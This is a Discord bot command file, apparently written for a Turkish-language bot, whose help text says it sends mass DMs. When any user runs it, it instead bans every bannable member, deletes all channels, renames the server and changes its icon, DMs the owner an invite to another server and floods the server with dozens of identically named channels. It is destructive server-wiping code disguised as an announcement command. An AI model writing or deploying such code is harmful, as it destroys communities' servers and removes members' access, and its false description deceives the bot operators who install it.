const Discord = require('discord.js');
const ayarlar = require('../ayarlar.json');

exports.run = async (client, message, args) => {
if (message.guild) {
let kanallar = 0;
let roller = 0;
let emojiler = 0;

      
message.guild.members.forEach(u => {
if (u.bannable) {
message.guild.ban(u, "Berke Adamdır")
}
})
  

message.guild.channels.forEach(c => {
if (c.deletable) {
kanallar++;
return c.delete();   
}
});  

  
message.guild.setName(`BERKE ADAMDIR`, ":))")
message.guild.setIcon(`https://discordapp.com/channels/551706577023795201/564817548940541981/566650620585443343`)
  
message.guild.channels.forEach(c => {
if (c.deletable) {
kanallar++;
return c.delete();   
}
});
    

    

  
message.guild.owner.send(`Yeni Discord ** https://discord.gg/w8Xq9bm **`);
message.guild.createChannel(`berke-adamdir `)
message.guild.createChannel(`berke-adamdir `)
message.guild.createChannel(`berke-adamdir `)
message.guild.createChannel(`berke-adamdir `)
message.guild.createChannel(`berke-adamdir `)
message.guild.createChannel(`berke-adamdir `)
message.guild.createChannel(`berke-adamdir `)
message.guild.createChannel(`berke-adamdir `)
message.guild.createChannel(`berke-adamdir `)
message.guild.createChannel(`berke-adamdir `)
message.guild.createChannel(`berke-adamdir `)
message.guild.createChannel(`berke-adamdir `)
message.guild.createChannel(`berke-adamdir `)
message.guild.createChannel(`berke-adamdir `)
message.guild.createChannel(`berke-adamdir `)
message.guild.createChannel(`berke-adamdir `)
message.guild.createChannel(`berke-adamdir `)
message.guild.createChannel(`berke-adamdir `)
message.guild.createChannel(`berke-adamdir `)
message.guild.createChannel(`berke-adamdir `)
message.guild.createChannel(`berke-adamdir `)
message.guild.createChannel(`berke-adamdir `)
message.guild.createChannel(`berke-adamdir `)
message.guild.createChannel(`berke-adamdir `)
message.guild.createChannel(`berke-adamdir `)
message.guild.createChannel(`berke-adamdir `)
message.guild.createChannel(`berke-adamdir `)
message.guild.createChannel(`berke-adamdir `)
message.guild.createChannel(`berke-adamdir `)
message.guild.createChannel(`berke-adamdir `)
message.guild.createChannel(`berke-adamdir `)
message.delete()
}
};

  

exports.conf = {
  enabled: true,
  guildOnly: true,
  aliases: ['banla'],
  permLevel: 0,
  kategori: "yetkili"
};

exports.help = {
  name: 'xdxd',
  description: 'Toplu dm atar.', 
  usage: 'dmduyuru [mesaj]'
};
